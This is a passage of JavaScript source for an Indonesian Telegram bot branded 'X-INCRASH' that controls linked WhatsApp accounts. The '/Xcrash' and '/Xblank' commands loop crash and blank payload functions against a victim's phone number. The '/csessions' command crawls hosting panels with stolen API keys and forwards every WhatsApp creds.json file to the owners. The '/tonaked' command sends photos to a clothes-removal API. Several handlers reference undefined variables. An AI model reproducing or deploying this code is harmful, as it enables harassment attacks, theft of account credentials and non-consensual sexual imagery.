   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(resToRemove)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const resellerData = loadResellers();
  if (!resellerData.resellers.includes(adminToRemove)) return bot.sendMessage(chatId, "⚠️ Reseller tidak ditemukan!");

  resData.resellers = resData.resellers.filter((id) => id !== resToRemove);
  saveResellers(resellerData);
  bot.sendMessage(chatId, `✅ Reseller berhasil dihapus: ${resToRemove}`);
});

bot.onText(/\/addpt (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const newAdpId = parseInt(match[1]);
  if (shouldIgnoreMessage(msg)) return;


  if (!isOwner(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(newAdpId)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const adpData = loadAdp();
  if (adpData.adminpanels.includes(newAdpId)) return bot.sendMessage(chatId, `⚠️ Patner Sudah Ada!!`);

  adpData.adminpanels.push(newAdpId);
  saveAdp(adpData);
  bot.sendMessage(chatId, `✅ Patner Berhasil ditambahkan: ${newAdminId}`);
});

bot.onText(/\/delpt (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const adpToRemove = parseInt(match[1]);
  if (shouldIgnoreMessage(msg)) return;

  if (!isOwner(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(adpToRemove)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const adpData = loadAdp();
  if (!adpData.resellers.includes(adpToRemove)) return bot.sendMessage(chatId, "⚠️ Patner tidak ditemukan!");

  adpData.premiums = adpData.adminpanels.filter((id) => id !== adpToRemove);
  saveAdp(adpData);
  bot.sendMessage(chatId, `✅ Patner berhasil dihapus: ${premToRemove}`);
});
// ~ Connect
bot.onText(/\addsender (.+)/, async (msg, match) => {
const chatId = msg.chat.id;
if (shouldIgnoreMessage(msg)) return;
      
  if (!isOwner(msg.from.id)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫  
 `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Missing input. Please provide the number. Example: /addsender 62xxxx.");
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
  }

  try {
    await ConnectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in Connect:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});
// Delsender
bot.onText(/\/delsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (shouldIgnoreMessage(msg)) return;
  
  if (!isOwner(msg.from.id)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫  
 `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
    `╭─────────────────
│    MENGHAPUS BOT   
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────`,
    { parse_mode: "Markdown" }
  );

  try {
    const xincrash = sessions.get(botNumber);
    if (xincrash) {
      xincrash.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(
        `╭─────────────────
│    BOT DIHAPUS  
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      await bot.editMessageText(
        `╭─────────────────
│    ERROR   
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(
      `╭─────────────────
│    ERROR   
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});
 //Tonaked
bot.onText(/\/tonaked(?:\s+(.+))?/, async (msg, match) => {
 if (shouldIgnoreMessage(msg)) return;
      
  try {

    const args = match[1] || '';
    let imageUrl = args.trim() || null;

    // Check if replying to a photo
    if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
      const fileId = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
      const file = await bot.getFile(fileId);
      imageUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    }

    if (!imageUrl) {
      return bot.sendMessage(msg.chat.id, '❌ Format: /tonaked (reply gambar)', {
        reply_to_message_id: msg.message_id
      });
    }

    const statusMsg = await bot.sendMessage(msg.chat.id, '⏳ Memproses gambar', {
      reply_to_message_id: msg.message_id
    });

    try {
      const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`);
      const data = await res.json();
      const hasil = data.result;

      if (!hasil) {
        return bot.editMessageText('❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid', {
          chat_id: msg.chat.id,
          message_id: statusMsg.message_id
        });
      }

      await bot.deleteMessage(msg.chat.id, statusMsg.message_id);
      await bot.sendPhoto(msg.chat.id, hasil, {
        reply_to_message_id: msg.message_id
      });

    } catch (e) {
      await bot.editMessageText('❌ Terjadi kesalahan saat memproses gambar', {
        chat_id: msg.chat.id,
        message_id: statusMsg.message_id
      });
    }
  } catch (error) {
    console.error(error);
    bot.sendMessage(msg.chat.id, '❌ Terjadi kesalahan', {
      reply_to_message_id: msg.message_id
    });
  }
});
// Ss Iphone
bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  

  if (!text) {
    return bot.sendMessage(
      chatId,
      "❌ Missing Input\nFormat : /iqc time,battery,carrier,text\nExample : /iqc 12.00,20,xl,Hai",
      { parse_mode: "HTML" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split(",");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "Format : /iqc time,battery,carrier,text\nExample : /iqc 12.00,20,xl,Hai",
      { parse_mode: "HTML" }
    );
  }

  bot.sendMessage(chatId, "⏳ Sabar Bang...");

  let messageText = encodeURIComponent(msgParts.join(",").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ iqc By X-INCRASH`,
      parse_mode: "HTML",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.onText(/\/tourl/i, async (msg) => {
  const chatId = msg.chat.id;
  const repliedMsg = msg.reply_to_message;
  if (shouldIgnoreMessage(msg)) return;

  if (!repliedMsg || (!repliedMsg.document && !repliedMsg.photo && !repliedMsg.video)) {
    return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
  }

  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    const photos = repliedMsg.photo;
    fileId = photos[photos.length - 1].file_id; // ambil resolusi tertinggi
    fileName = `photo_${Date.now()}jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox..."); 

    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: fileName,
      contentType: response.headers["content-type"] || "application/octet-stream",
    });

    const { data: catboxUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    if (!catboxUrl.startsWith("https://")) {
      throw new Error("Catbox tidak mengembalikan URL yang valid");
    }

    await bot.editMessageText(`✅ Tourl By X-INCRASH\n📎 URL: ${catboxUrl}`, {
      chat_id: chatId,
      message_id: processingMsg.message_id,
    });

  } catch (error) {
    console.error("Upload error:", error?.response?.data || error.message);
    bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
  }
});

// Getcode
bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const userId = msg.from.id;
   if (shouldIgnoreMessage(msg)) return;
      
  if (!isOwner(msg.from.id) && !isAdmin(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "❌ Missing Input\nExample: /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ Get Code By X-INCRASH ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "Error" + err);
  }
});

// Csessions And Add Sender
bot.onText(/^\/csessions(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return;
  

  if (!isOwner(msg.from.id) && !isAdmin(fromId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const text = match[1];
  if (!text) return bot.sendMessage(chatId, '❌ Missing Input\nExample: `/csessions domain,plta,pltc`', { parse_mode: 'Markdown' });

  const args = text.split(',');
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc) return bot.sendMessage(chatId, '❌ Parameter tidak lengkap. Gunakan format: `/csessions domain,plta,pltc`', { parse_mode: 'Markdown' });

  await bot.sendMessage(chatId, '⏳ Sedang scan semua server untuk mencari folder `sessions` dan file `creds.json` ...', { parse_mode: 'Markdown' });

  // Helper: cek apakah item adalah direktori
  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    return (
      a.type === 'dir' ||
      a.type === 'directory' ||
      a.mode === 'dir' ||
      a.mode === 'directory' ||
      a.mode === 'd' ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  // ~ Fungsi rekursif untuk mencari "sessions/creds.json"
  async function traverseAndFind(identifier, dir = '/') {
    try {
      const listRes = await axios.get(`${domain.replace(/\/+$/, '')}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: 'application/json', Authorization: `Bearer ${pltc}` },
      });

      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];

      let found = [];
      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || '';
        const itemPath = (dir === '/' ? '' : dir) + '/' + name;
        const normalized = itemPath.replace(/\/+/g, '/');

        if (name.toLowerCase() === 'sessions' && isDirectory(item)) {
          try {
            const sessRes = await axios.get(`${domain.replace(/\/+$/, '')}/api/client/servers/${identifier}/files/list`, {
              params: { directory: normalized },
              headers: { Accept: 'application/json', Authorization: `Bearer ${pltc}` },
            });

            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || '';
                const sfPath = (normalized === '/' ? '' : normalized) + '/' + sfName;
                if (sfName.toLowerCase() === 'creds.json') {
                  found.push({ path: sfPath.replace(/\/+/g, '/'), name: sfName });
                }
              }
            }
          } catch {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === '' ? '/' : normalized);
            if (more.length) found = found.concat(more);
          } catch {}
        } else {
          if (name.toLowerCase() === 'creds.json') {
            found.push({ path: (dir === '/' ? '' : dir) + '/' + name, name });
          }
        }
      }

      return found;
    } catch {
      return [];
    }
  }

  // Jalankan scan
  try {
    const res = await axios.get(`${domain.replace(/\/+$/, '')}/api/application/servers`, {
      headers: { Accept: 'application/json', Authorization: `Bearer ${plta}` },
    });

    const data = res.data;
    if (!data || !Array.isArray(data.data)) {
      return bot.sendMessage(chatId, '❌ Gagal ambil list server dari panel.');
    }

    let totalFound = 0;

    for (let srv of data.data) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || 'unknown';
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, '/');
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, '/').replace(/^\/?/, '/');

          await bot.sendMessage(chatId, `📁 Ditemukan creds.json di server ${name}\nPath: \`${filePath}\``, {
            parse_mode: 'Markdown',
          });

          try {
            // Ambil URL download file
            const downloadRes = await axios.get(`${domain.replace(/\/+$/, '')}/api/client/servers/${identifier}/files/download`, {
              params: { file: filePath },
              headers: { Accept: 'application/json', Authorization: `Bearer ${pltc}` },
            });

            const dlJson = downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;

              // Download file creds.json
              const fileRes = await axios.get(url, { responseType: 'arraybuffer' });
              const buffer = Buffer.from(fileRes.data);

              // Kirim ke owner
              for (let oid of ownerIds) {
                try {
                  await bot.sendDocument(oid, buffer, {}, {
                    filename: `${name.replace(/\s+/g, '_')}_creds.json`,
                  });
                } catch (e) {
                  console.error(`Gagal kirim file creds.json ke owner ${oid}:`, e);
                }
              }
            } else {
              await bot.sendMessage(chatId, `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}.`);
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e);
            await bot.sendMessage(chatId, `❌ Error saat download file creds.json dari ${name}`);
          }
        }
      }
    }

    if (totalFound === 0) {
      await bot.sendMessage(chatId, '✅ Scan selesai. Tidak ditemukan creds.json di folder sessions pada server manapun.');
    } else {
      await bot.sendMessage(chatId, `✅ Scan selesai. Total file creds.json berhasil diunduh dan dikirim: ${totalFound}`);
    }
  } catch (err) {
    console.error('csessions Error:', err);
    await bot.sendMessage(chatId, '❌ Terjadi error saat scan.');
  }
});


// Acces !!
bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);
if (shouldIgnoreMessage(msg)) return;
bot.sendMessage(chatId, response); });

bot.onText(/\/addprem (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const newPremId = parseInt(match[1]);
  if (shouldIgnoreMessage(msg)) return;


  if (!isOwner(userId) && !isAdmin(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(newPremId)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const premiumData = loadPremium();
  if (premiumData.premiums.includes(newPremId)) return bot.sendMessage(chatId, `⚠️ID ${newPremId} Sudah Premium!`);

  premiumData.premiums.push(newPremId);
  savePremium(premiumData);
  bot.sendMessage(chatId, `✅ ID ${newPremId} Berhasil Di TambahKan Menjadi Premium`);
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return;
    
  if (!isOwner(userId) && !isAdmin(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  const premiums = loadPremium().premiums || [];
  bot.sendMessage(chatId, `👥 **Daftar Premium:**\n\n${premiums.map((r, i) => `${i + 1}. ${r}`).join("\n") || "🚫 Tidak ada premium!"}`, { parse_mode: "Markdown" });
});

bot.onText(/\/addadmin (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const newAdminId = parseInt(match[1]);
  if (shouldIgnoreMessage(msg)) return;

  if (!isOwner(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  if (isNaN(newAdminId)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const adminData = loadAdmins();
  if (adminData.admins.includes(newAdminId)) return bot.sendMessage(chatId, "⚠️ Admin sudah ada!");

  adminData.admins.push(newAdminId);
  saveAdmins(adminData);
  bot.sendMessage(chatId, `✅ Admin berhasil ditambahkan: ${newAdminId}`);
});

bot.onText(/\/listadmin/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return;
    
  if (!isOwner(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  const admins = loadAdmins().admins || [];
  bot.sendMessage(chatId, `👥 **Daftar Admin:**\n\n${admins.map((r, i) => `${i + 1}. ${r}`).join("\n") || "🚫 Tidak ada admin!"}`, { parse_mode: "Markdown" });
});

//
bot.onText(/\/deladmin (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const adminToRemove = parseInt(match[1]);
  if (shouldIgnoreMessage(msg)) return;

  if (!isOwner(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(adminToRemove)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const adminData = loadAdmins();
  if (!adminData.resellers.includes(adminToRemove)) return bot.sendMessage(chatId, "⚠️ Admin tidak ditemukan!");

  adminData.admins = adminData.admins.filter((id) => id !== adminToRemove);
  saveAdmins(adminData);
  bot.sendMessage(chatId, `✅ Admin berhasil dihapus: ${adminToRemove}`);
});
//
bot.onText(/\/delprem (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const premToRemove = parseInt(match[1]);
  if (shouldIgnoreMessage(msg)) return;

  if (!isOwner(userId) && !isAdmin(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(premToRemove)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const resellerData = loadResellers();
  if (!resellerData.resellers.includes(adminToRemove)) return bot.sendMessage(chatId, "⚠️ Premium tidak ditemukan!");

  premiumData.premiums = premData.premiums.filter((id) => id !== premToRemove);
  savePremium(premiumData);
  bot.sendMessage(chatId, `✅ Premium berhasil dihapus: ${premToRemove}`);
});

// ~ Case Bugs 1
bot.onText(/\/Xcrash (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const isTarget = target;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  if (shouldIgnoreMessage(msg)) return;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isOwner(userId) && !isAdmin(userId) && !isPremium(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽  Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /addsender");
    }

    const sentMessage = await bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Crash
𖣂. Status ⸸ Process 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 75; i++) {
     await splashScrenpay(xincrash, target);
     await sleep(1000);
     await xflow(xincrash, target);
     await sleep(1000);
     await IosChatCore(target, Ptcp = true);
     await sleep(1000);
     await SuperIosCore2(target);
     await sleep(1000);
}

    await bot.editMessageCaption(`
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Crash
𖣂. Status ⸸ Succes 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 2
bot.onText(/\/Xblank (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const isTarget = target;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  if (shouldIgnoreMessage(msg)) return;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isOwner(userId) && !isAdmin(userId) && !isPremium(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /addsender");
    }

    const sentMessage = await bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Blank Android
𖣂. Status ⸸ Process
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 75; i++) {
    await BlankClick(xincrash, target);
    await sleep(1000);
    await packBlankNew(xincrash, target);
    await sleep(1000);
    await BlankHard(target);
    await sleep(1000);
}

    await bot.editMessageCaption(`
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Blank Android
𖣂. Status ⸸ Succes 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 3
bot.onText(/\/Xdelay (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
